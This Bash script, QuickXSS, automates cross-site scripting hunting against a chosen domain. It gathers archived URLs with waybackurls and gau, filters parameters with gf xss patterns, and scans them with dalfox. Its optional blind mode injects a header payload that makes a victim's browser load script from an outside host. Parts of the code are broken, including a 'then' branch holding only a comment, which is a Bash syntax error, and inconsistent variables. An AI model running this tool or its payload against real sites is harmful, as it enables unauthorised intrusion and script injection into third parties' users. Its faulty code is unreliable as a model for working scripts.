#! /bin/bash

set -e

bold="\e[1m"
version="1.2.0"
red="\e[1;31m"
green="\e[32m"
blue="\e[34m"
cyan="\e[0;36m"
end="\e[0m"

echo -e "$cyan
 ██████╗  ██╗   ██╗██╗ ██████╗██╗  ██╗    ██╗  ██╗███████╗███████╗
 ██╔═══██╗██║   ██║██║██╔════╝██║ ██╔╝    ╚██╗██╔╝██╔════╝██╔════╝
 ██║   ██║██║   ██║██║██║     █████╔╝      ╚███╔╝ ███████╗███████╗
 ██║▄▄ ██║██║   ██║██║██║     ██╔═██╗      ██╔██╗ ╚════██║╚════██║
 ╚██████╔╝╚██████╔╝██║╚██████╗██║  ██╗    ██╔╝ ██╗███████║███████║
  ╚══▀▀═╝  ╚═════╝ ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝╚══════╝
$end "

printf "$bold$blue ** Developed by theinfosecguy <3 ** \n\n$end"

contruct_mode(){
    if [ -d "output" ]
    then
       # cd output;
    else
        mkdir output;
        #cd output;
    fi

    echo -e "${green}Creating Directory for $1 ....$end";

    if [ -d "$1" ]; then
        printf "$red$1 Directory already exits. Please try again.\n\n$end";
        exit 1;
    fi

    mkdir output/$domain
#    cd output/$domain

    echo -e "\nFinding URLs for $domain using ./waybackurls ...."

    echo "$domain" | ./waybackurls | tee output/$domain/$domain.txt >/dev/null 2>&1;
    printf "URLS fetched using ./waybackurls & Stored in $blue$domain.txt$end"
    printf "\n\nFinding URLs for $domain using ./gau ....\n"
    echo "$1" | ./gau | tee -a output/$domain/$domain.txt >/dev/null 2>&1;
    printf "URLS fetched using ./gau & appended in $blue$domain.txt$end \n\n"

    echo -e "\nFinding valid URLs for XSS using GF Patterns \n"

    cat output/$domain/"$domain".txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee output/$domain/"$domain"_temp_xss.txt >/dev/null 2>&1;

    sort output/$domain/"$domain"_temp_xss.txt | uniq | tee output/$domain/"$domain"_xss.txt >/dev/null 2>&1;
    printf "\nXSS Vulnerable URL's added to $blue"$domain"_xss.txt$end\n\n"
}

usage(){
    printf "QuickXSS Usage:\n\n"
    printf "./QuickXSS.sh -d <target.com>\n"
    printf "./QuickXSS.sh -d <target.com> -b <blindxss.xss.ht>\n"
    printf "./QuickXSS.sh -d <target.com> -o xss_output.txt \n"
    printf "./QuickXSS.sh -d <target.com> -b <blindxss.xss.ht> -o xss_output.txt\n\n"
    exit 1;
}

missing_arg(){
    echo -e "${red}${bold}Missing Argument $1$end\n";
    usage;
}

# Handling user arguments
while [ -n "$1" ]; do
	case $1 in
		-d|--domain)
			domain=$2
			shift ;;
        -b|--blind)
			blind=$2
			shift 
            ;;
        -o| --output)
            out=$2
            shift
            ;;
		-h|--help)
			usage
            ;;
		-v|--version)
			echo "Version of QuickXSS: $version"
			exit 0 ;;
		*)
			echo "[-] Unknown Option: $1"
			usage ;;
	esac
	shift
done

# Creating Dir and fetch urls for a domain
[[ $domain ]] && contruct_mode "$domain" || missing_arg "-d";

# Check if output Argument is present or not.
if [ -z "$out" ]
then
    out="output/$domain/output.txt"
    printf "No Output File selected, output will be stored in $out\n"
fi

# STart XSS Hunting by checking if Blind XSS payload is present or not.
if [ -z "$blind" ] ; then
    echo "XSS Automation Started using Dalfox.."
    dalfox file output/$domain/"$domain"_xss.txt -o $out
else
    echo "XSS Automation Started using Dalfox with your Blind Payload.."
    dalfox file output/$domain/"$domain"_xss.txt -b $blind -o $out -H "referrer: xxx'><script src=//$blind></script>"
fi

# Final Result
echo -e "XSS automation completed, output stored in$blue output/$domain ${end}Directory"
